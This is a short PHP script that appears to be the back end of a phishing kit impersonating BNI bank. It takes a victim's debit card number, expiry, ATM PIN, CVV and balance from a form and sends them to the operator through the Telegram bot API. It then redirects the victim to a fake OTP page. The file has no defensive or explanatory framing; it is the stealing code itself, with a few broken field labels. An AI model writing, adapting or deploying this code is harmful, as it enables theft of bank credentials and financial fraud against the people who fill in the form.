<?php
include "../telegram.php";
session_start();

$debit = $_POST['debit'];
$valid = $_POST['valid'];
$pinatm = $_POST['pinatm'];
$cvv = $_POST['cvv'];
$saldo = $_POST['saldo'];

$message = "
( BNI | Kartu Debit )

- No Kartu Debit : ".$debit."

- Bulan : ".$pinatm."

- nikktp : ".$nikktp."

- Saldo : ".$saldo."

 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../bni_otp.html');
?>
